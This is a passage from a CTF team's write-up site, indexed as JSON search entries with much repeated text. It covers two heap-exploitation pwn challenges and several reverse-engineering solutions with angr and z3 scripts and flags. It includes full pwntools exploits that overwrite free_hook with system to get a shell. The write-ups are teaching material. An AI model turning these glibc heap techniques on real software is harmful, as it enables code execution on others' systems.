overwrite it with \u201c/bin/sh\\x00\u201d + libc_system_address. Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed. Exploit from pwn import * p = process( ./easy ,env = { LD_PRELOAD : ./libc-2.31.so }) p.recvuntil( Here is your gift: ) leak = int(p.recvline().strip(),16) print(hex(leak)) libc_start = leak - 0x08ec50 log.info( libc_start = + hex(libc_start)) system = libc_start + 0x055410 free_hook = libc_start + 0x00000000001eeb28 tls_tcache = libc_start + 0x1f34f0 fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8) p.sendafter( Input your message: ,fake_tcache) p.sendafter( Where to write?: ,p64(tls_tcache)) p.sendafter( Any last message?: , /bin/sh\\x00 +p64(system)) p.interactive()","title":"EasyWrite"},{"location":"pwning/N1CTF20/easywrite/#easywrite","text":"The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I\u2019ll be explaining about my approach for the EasyWrite, so let\u2019s get started!","title":"EasyWrite"},{"location":"pwning/N1CTF20/easywrite/#initial-click","text":"All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows: Gives us the libc leak directly We can input 0x299 bytes which is stored on the heap [chunk1] Asks us to enter an address [addr1] where contents of chunk1 are copied to Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk. chunk2 is freed. From this I could deduce that overwriting free_hook could be the key. But it wasn\u2019t really that easy.","title":"Initial Click"},{"location":"pwning/N1CTF20/easywrite/#what-did-not-work","text":"On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn\u2019t find any other targets for a long while. Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy.","title":"What did not work?"},{"location":"pwning/N1CTF20/easywrite/#crux-controlling-tcache","text":"We know that it\u2019s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks? I found a mmap\u2019d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 .","title":"Crux: Controlling Tcache"},{"location":"pwning/N1CTF20/easywrite/#what-happened-next","text":"Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) = system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and overwrite it with \u201c/bin/sh\\x00\u201d + libc_system_address. Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed.","title":"What happened next?"},{"location":"pwning/N1CTF20/easywrite/#exploit","text":"from pwn import * p = process( ./easy ,env = { LD_PRELOAD : ./libc-2.31.so }) p.recvuntil( Here is your gift: ) leak = int(p.recvline().strip(),16) print(hex(leak)) libc_start = leak - 0x08ec50 log.info( libc_start = + hex(libc_start)) system = libc_start + 0x055410 free_hook = libc_start + 0x00000000001eeb28 tls_tcache = libc_start + 0x1f34f0 fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8) p.sendafter( Input your message: ,fake_tcache) p.sendafter( Where to write?: ,p64(tls_tcache)) p.sendafter( Any last message?: , /bin/sh\\x00 +p64(system)) p.interactive()","title":"Exploit"},{"location":"pwning/VolgaCTF20/notepad/","text":"Notepad-- This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY. Reversing The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook aaaaaaa [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab- size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on! Vulnerability and the exploit Getting the leaks As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using! Overwriting the free_hook The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts( You've reached the limit for notebooks! Delete some of the older once first! ); v1 = nb_ctr++; v2 = (char *) table + 2072 * v1; printf( Enter notebook name: ); return __isoc99_scanf( %s , v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook- number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs- data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!! Exploit Code from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter(' ','l') def dele_note(idx): r.sendlineafter(' ','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter(' ','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter(' ','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter(' ','l') def update_tab(idx,name,length,data): r.sendlineafter(' ','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter(' ','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter(' ','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#notepad-","text":"This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY.","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#reversing","text":"The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook aaaaaaa [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab- size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on!","title":"Reversing"},{"location":"pwning/VolgaCTF20/notepad/#vulnerability-and-the-exploit","text":"","title":"Vulnerability and the exploit"},{"location":"pwning/VolgaCTF20/notepad/#getting-the-leaks","text":"As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using!","title":"Getting the leaks"},{"location":"pwning/VolgaCTF20/notepad/#overwriting-the-free_hook","text":"The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts( You've reached the limit for notebooks! Delete some of the older once first! ); v1 = nb_ctr++; v2 = (char *) table + 2072 * v1; printf( Enter notebook name: ); return __isoc99_scanf( %s , v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook- number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs- data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!!","title":"Overwriting the free_hook"},{"location":"pwning/VolgaCTF20/notepad/#exploit-code","text":"from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter(' ','l') def dele_note(idx): r.sendlineafter(' ','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter(' ','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter(' ','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter(' ','l') def update_tab(idx,name,length,data): r.sendlineafter(' ','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter(' ','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter(' ','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Exploit Code"},{"location":"reversing/intro/","text":"Reversing Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category. The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis - By @sandrabeme APLab:Statistics - By @sandrabeme APLab:English - By @sandrabeme APLab:ComputerScience - By @namithas123 DarkCTF Jack - By @sandrabeme","title":"Reversing"},{"location":"reversing/intro/#reversing","text":"","title":"Reversing"},{"location":"reversing/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category.","title":"Introduction"},{"location":"reversing/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis - By @sandrabeme APLab:Statistics - By @sandrabeme APLab:English - By @sandrabeme APLab:ComputerScience - By @namithas123 DarkCTF Jack - By @sandrabeme","title":"The contents of this repo"},{"location":"reversing/ByteBandits20/auto_bot/","text":"Auto_bot Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil( \\n ) flag.write(str(o)) out = base64.b64decode(o) n=open( new , wb ) n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project( ./new ) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b good job in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/auto_bot/#auto_bot","text":"Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil( \\n ) flag.write(str(o)) out = base64.b64decode(o) n=open( new , wb ) n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project( ./new ) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b good job in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/baby_rust/","text":"Baby_Rust Analysing it dynamically gets us to xoring instructions: d = adhmp`badO|sL}JuvvFmiui{@IO}QQVR k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/ByteBandits20/baby_rust/#baby_rust","text":"Analysing it dynamically gets us to xoring instructions: d = adhmp`badO|sL}JuvvFmiui{@IO}QQVR k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/DarkCTF/Jack/","text":"Emojis - Misc HSCTF2020 Description We are given a binary which takes a string input and multiple math checks are performed on the input and had a good address which had to be achieved. The solution was obtained using a simple angr find and avoid script. Solution Script import angr import claripy import sys proj=angr.Project('./jack',load_options={'auto_load_libs':False},main_opts={'base_addr':0x400000}) flag=[claripy.BVS('flag%i'%i,8) for i in range(16)] flag_concat=claripy.Concat(*flag + [claripy.BVV( \\n )]) state=proj.factory.entry_state(stdin=flag_concat) for i in flag: state.solver.add(i =32) state.solver.add(i =127) simgr=proj.factory.simgr(state) simgr.explore(find=0x401489,avoid=[0x4012B3, 0x401468]) if simgr.found: simulation=simgr.found[0] print(simulation.posix.dumps(sys.stdin.fileno())) else: print( FAILURE ) Output n0_5ymb0l1c,3x30 This output was enclosed in the flagformat and submitted","title":"Emojis - Misc HSCTF2020"},{"location":"reversing/DarkCTF/Jack/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"reversing/DarkCTF/Jack/#description","text":"We are given a binary which takes a string input and multiple math checks are performed on the input and had a good address which had to be achieved. The solution was obtained using a simple angr find and avoid script.","title":"Description"},{"location":"reversing/DarkCTF/Jack/#solution-script","text":"import angr import claripy import sys proj=angr.Project('./jack',load_options={'auto_load_libs':False},main_opts={'base_addr':0x400000}) flag=[claripy.BVS('flag%i'%i,8) for i in range(16)] flag_concat=claripy.Concat(*flag + [claripy.BVV( \\n )]) state=proj.factory.entry_state(stdin=flag_concat) for i in flag: state.solver.add(i =32) state.solver.add(i =127) simgr=proj.factory.simgr(state) simgr.explore(find=0x401489,avoid=[0x4012B3, 0x401468]) if simgr.found: simulation=simgr.found[0] print(simulation.posix.dumps(sys.stdin.fileno())) else: print( FAILURE )","title":"Solution Script"},{"location":"reversing/DarkCTF/Jack/#output","text":"n0_5ymb0l1c,3x30 This output was enclosed in the flagformat and submitted","title":"Output"},{"location":"reversing/HSCTF7/APLabEnglish/","text":"APLab:English Description Another java Reversing Challenge. We are given a java file which is to be reversed. Solution s= 1dd3|y_3tttb5g\\`q]^dhn3j def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]\\*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s) Output 5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#aplabenglish","text":"","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#description","text":"Another java Reversing Challenge. We are given a java file which is to be reversed.","title":"Description"},{"location":"reversing/HSCTF7/APLabEnglish/#solution","text":"s= 1dd3|y_3tttb5g\\`q]^dhn3j def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]\\*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s)","title":"Solution"},{"location":"reversing/HSCTF7/APLabEnglish/#output","text":"5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"Output"},{"location":"reversing/HSCTF7/ComputerScience/","text":"APLab:Computer Science principle HSCTF Description A java RE challenge from HSCTF 2020 The challenge gives a simple java code ,which basically takes in an input of length 18, if (inp.length()!=18) { System.out.println( Your input is incorrect. ); System.exit(0) } Convert it to a string through different functions inp=shift2(shift(inp)); where shift2(): public static String shift2(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)+ Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } Shift(): public static String shift(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)-i); } System.out.println(ret); return ret; } and checks if inp is the string given.: if (inp.equals( inagzgkpm)Wl Tg io )) { System.out.println( Correct. Your input is the flag. ); } else { System.out.println( Your input is incorrect. ); } So all the program needed was to reverse it to get the input they are asking for Hence import java.util.Scanner; public class ComputerSciencePrinciples { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String inp = sc.nextLine(); if (inp.length()!=18) { System.out.println( Your input is incorrect. ); System.exit(0); } String x=shift2(inp); String y=shift(x); System.out.println(inp); } public static String shift(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)+i); } System.out.println(ret); return ret; } public static String shift2(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)-Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } } Where if input is given as:\"inagzgkpm)Wl Tg io\" Give: flag{intr0_t0_r3v}","title":"ComputerScience"},{"location":"reversing/HSCTF7/ComputerScience/#aplabcomputer-science-principle-hsctf","text":"","title":"APLab:Computer Science principle HSCTF"},{"location":"reversing/HSCTF7/ComputerScience/#description","text":"A java RE challenge from HSCTF 2020 The challenge gives a simple java code ,which basically takes in an input of length 18, if (inp.length()!=18) { System.out.println( Your input is incorrect. ); System.exit(0) } Convert it to a string through different functions inp=shift2(shift(inp)); where shift2(): public static String shift2(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)+ Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } Shift(): public static String shift(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)-i); } System.out.println(ret); return ret; } and checks if inp is the string given.: if (inp.equals( inagzgkpm)Wl Tg io )) { System.out.println( Correct. Your input is the flag. ); } else { System.out.println( Your input is incorrect. ); } So all the program needed was to reverse it to get the input they are asking for Hence import java.util.Scanner; public class ComputerSciencePrinciples { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String inp = sc.nextLine(); if (inp.length()!=18) { System.out.println( Your input is incorrect. ); System.exit(0); } String x=shift2(inp); String y=shift(x); System.out.println(inp); } public static String shift(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)+i); } System.out.println(ret); return ret; } public static String shift2(String input) { String ret = ; for (int i = 0; i input.length(); i++) { ret+=(char)(input.charAt(i)-Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } } Where if input is given as:\"inagzgkpm)Wl Tg io\" Give: flag{intr0_t0_r3v}","title":"Description"},{"location":"reversing/HSCTF7/Dis/","text":"Dis HSCTF2020 Description The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3. Solution bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#dis-hsctf2020","text":"","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#description","text":"The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3.","title":"Description"},{"location":"reversing/HSCTF7/Dis/#solution","text":"bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Solution"},{"location":"reversing/HSCTF7/Statistics/","text":"APLab:Statistics HSCTF Description A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge. Solution import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring= qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba String com = fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey ; String guess = abcdefghijklmnopqrstuvwxyz{_}| ; System.out.print( f ); for (int i = 1 ; i com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#aplabstatistics-hsctf","text":"","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#description","text":"A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java 